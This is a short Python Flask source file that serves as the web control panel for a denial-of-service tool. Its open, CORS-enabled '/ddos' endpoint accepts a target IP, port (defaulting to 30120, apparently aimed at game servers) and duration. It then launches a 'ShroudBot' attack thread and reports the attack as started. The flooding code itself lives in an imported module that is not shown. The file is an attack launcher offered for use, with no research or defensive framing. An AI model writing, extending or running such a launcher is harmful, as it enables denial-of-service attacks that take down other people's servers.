from flask import Flask, request, jsonify
from flask_cors import CORS
from bot import ShroudBot
import threading

app = Flask(__name__)
CORS(app)

@app.route('/ddos', methods=['POST'])
def trigger_ddos():
    data = request.json
    target_ip = data.get('ip')
    port = int(data.get('port', 30120))
    duration = int(data.get('duration', 60))
    
    if not target_ip:
        return jsonify({"status": "error", "message": "Target IP is required!"}), 400

    try:
        bot = ShroudBot(target_ip=target_ip, target_port=port)
        thread = threading.Thread(target=bot.start_attack, args=(duration,))
        thread.start()
        
        return jsonify({
            "status": "success",
            "message": f"Attack successfully started on {target_ip}:{port}!"
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
